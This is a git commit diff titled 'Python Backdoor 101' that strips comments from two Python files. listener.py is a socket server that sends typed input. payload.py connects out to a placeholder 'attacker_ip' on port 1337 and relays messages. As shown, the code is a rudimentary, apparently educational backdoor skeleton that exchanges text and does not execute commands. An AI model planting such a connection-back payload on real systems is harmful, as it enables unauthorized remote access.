58b4c78b0e01f5b03e5c239736d6e66044e87719
0x3b <h4x0r@localhost.localdomain>
2024-10-22 08:44:04 +0800

    Python Backdoor 101

--- listener.py
+++ listener.py
@@ -11,12 +11,9 @@ print("Server has started")
 connection, address = listener.accept()
 print(f"Connected to {address}")
 
-## create loop that will iterate continuously
 while True:
 	inp = input(">> ")
-	## convert the input string into bytes and decoded
 	connection.send(bytes(inp, "utf-8"))
 	
-	## server machine should also receive information same as client
 	recv = connection.recv(2048)
 	print(recv.decode("utf-8"))
--- payload.py
+++ payload.py
@@ -6,12 +6,9 @@ payload.connect(("attacker_ip", 1337))
 
 print("Connected")
 
-## create loop that will receive data continuously sent by client machine
 while True:
 	recv = payload.recv(2048)
 	print(recv.decode("utf-8"))
 
-	## if the client machine wants to send information first
 	inp = input(">> ")
-	## convert the input string into bytes and decoded
 	payload.send(bytes(inp, "utf-8"))
